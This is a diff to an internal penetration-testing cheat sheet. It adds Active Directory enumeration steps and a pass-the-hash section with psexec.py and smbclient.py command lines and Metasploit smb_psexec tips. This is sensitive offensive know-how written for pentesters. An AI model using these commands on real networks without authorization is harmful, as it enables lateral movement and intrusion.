@@ -1,4 +1,4 @@
-# Internal Pen test cheetsheet
+# Internal Pentest Cheetsheet
 
 ## Recon
 1) Use wireshark to listen for 30mins, once completed sift through it and try to identify hosts/interesting things.
@@ -12,6 +12,9 @@ grep 10 >> cleaned_ips.txt && nmap --max-rtt-timeout 100ms --initial-rtt-timeout
 ```
 4) Now you have all the up hosts, their ports etc, feed the XML into pentest-machine, it'll speed up the enumeration of large subnets.
 5) Eliminate low hanging fruit
+6) If user account is provided, use bloodhound or AD-Recon to enumerate all of AD.
+  Feed AD-Recon's Computers.csv into fruity-ad.py - it'll show you what you can pwn easily.
+7) Profit
 
 ## Exploitation
 
@@ -20,6 +23,14 @@ grep 10 >> cleaned_ips.txt && nmap --max-rtt-timeout 100ms --initial-rtt-timeout
 
 
 ## Useful shit
+
+### Dont always have to crack the hash, maybe pass it??
+```
+psexec.py -hashes LM:NTLM DOMAIN/User@IP
+smbclient.py -hashes LM:NTLM DOMAIN/User@IP
+```
+MSF Allows you to use the NTLM hash in the password field in exploit/windows/smb_psexec
+Don't forget that native upload (Target 3) works if powershell is disabled on the box
 
 ### Enable RDP from CMD
 ```
